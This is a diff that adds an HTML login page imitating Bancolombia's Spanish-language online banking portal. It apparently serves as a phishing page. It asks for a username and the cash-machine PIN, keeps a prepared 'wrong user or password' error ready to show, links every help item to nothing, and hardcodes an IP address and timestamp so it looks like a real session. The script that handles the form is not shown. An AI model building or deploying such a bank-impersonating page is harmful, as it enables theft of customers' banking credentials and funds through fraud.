@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Sucursal Virtual Personas</title>
+    <link rel="stylesheet" href="style.css">
+    </head>
+<body>
+    <div class="background-wave-orange"></div>
+    <div class="background-wave-yellow"></div>
+
+    <header class="header">
+        <div class="logo">
+            <img src="bancolombia_logo.png" alt="Bancolombia Logo">
+        </div>
+        <h1 class="header-title">Sucursal Virtual Personas</h1>
+    </header>
+
+    <main class="main-content">
+        <div class="message-box system-update">
+            <span class="icon-info"></span>
+            <p><strong>Actualizaremos nuestros sistemas</strong></p>
+            <p>Nuestros canales no estarán disponibles el sábado 19 de julio desde las 03:00 hasta las 4:00 de la mañana. En esa hora, paga con tus tarjetas físicas o retira plata en cajeros.</p>
+        </div>
+
+        <div id="login-form-container" class="login-container">
+            <div id="error-message" class="message-box error-hidden">
+                <span class="icon-warning"></span>
+                <p><strong>Usuario o clave incorrecta</strong></p>
+                <p>Verifica la información e inténtalo de nuevo.</p>
+                <button class="close-error" onclick="hideError()">×</button>
+            </div>
+
+            <p class="greeting">¡Hola!</p>
+            <p class="instruction">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+            <form id="login-form">
+                <div class="input-group">
+                    <label for="username">Usuario</label>
+                    <input type="text" id="username" name="username" placeholder="Ingresa tu usuario">
+                    <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Clave del cajero</label>
+                    <input type="password" id="password" name="password" placeholder="Ingresa tu clave">
+                    <a href="#" class="forgot-link">¿Olvidaste tu clave?</a>
+                </div>
+
+                <button type="submit" id="login-button" class="btn-login">Iniciar sesión</button>
+            </form>
+
+            <a href="#" class="btn-create-user">Crear usuario</a>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="logo-footer">
+            <img src="bancolombia_logo.png" alt="Bancolombia Logo Footer">
+        </div>
+        <nav class="footer-nav">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </nav>
+        <div class="footer-info">
+            <p>Dirección IP: 200.3.145.98</p>
+            <p>martes, 15 de julio de 2025, 10:23 a.m.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
